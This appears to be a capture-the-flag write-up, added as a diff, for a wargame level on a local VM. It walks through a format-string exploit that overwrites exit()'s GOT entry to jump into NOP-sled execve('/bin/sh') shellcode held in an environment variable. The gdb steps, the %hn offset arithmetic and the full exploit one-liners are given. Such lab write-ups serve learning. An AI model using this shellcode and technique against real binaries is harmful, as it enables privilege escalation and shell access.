@@ -1,0 +1,42 @@
+start ssh connection with ssh -p 4242 level04@127.0.0.1 use flag from level03
+
+we have a fgets buffer that can not overflow but then a format string using this buffer with lowercase at main+195 (see source) occures - we can exploit it!
+
+unortunately main ends with exit funtion so we can not just rewrite the return pointer of the stack (also we only have 100 chars to do it) but we can rewrite the GOT address of exit() function to the environment variable address that contains our shellcode
+
+we can run gdb whith such a variable with 1000 symbols nop slide before it the shellcode is:
+ #include <stdio.h>
+       main() {
+       char *name[2];
+       name[0] = "sh";
+       name[1] = NULL;
+       execve("/bin/sh",name,NULL);
+          }
+
+the following code is a result:
+env -i PAYLOAD=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') gdb level05
+
+we can understand the point at which printf places the content of format string - it is on 10th position on stack
+python -c 'print "AAAA"+"-%x"*50' | ./level05 - code to indentify it
+
+we can identify the GOT address of exit funtion:
+info functions exit
+x/i 0x08048370
+it is 0x80497e0
+
+we can identify the address of our variable and choose any entrypoint at the nop slide, for example 0xffffdde9
+x/200s environ
+
+then we shall transform this address into our format string:
+0xffffdde9 = 4294958569 or dde9 (56809-8) and ffff (65535 - 56809 = 8726)
+
+"\xe0\x97\x04\x08"- first 2 bytes
+"\xe2\x97\x04\x08" - second 2 bytes
+"%56801x"+"%10$hn" - spaces and first %n to rewrite
+"%8726d"+"%11$hn"' - spaces and second %n to rewrite
+python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08%56801x%10$hn%8726d%11$hn"' - result string
+
+then we should put this string into the abovemetioned environment and pray:
+(python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08%56801x%10$hn%8726x%11$hn"';cat) | env -i PAYLOAD=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') ./level05 - cat so that we stay in the input mode
+
+go to the level06 folder and check flag in .pass!
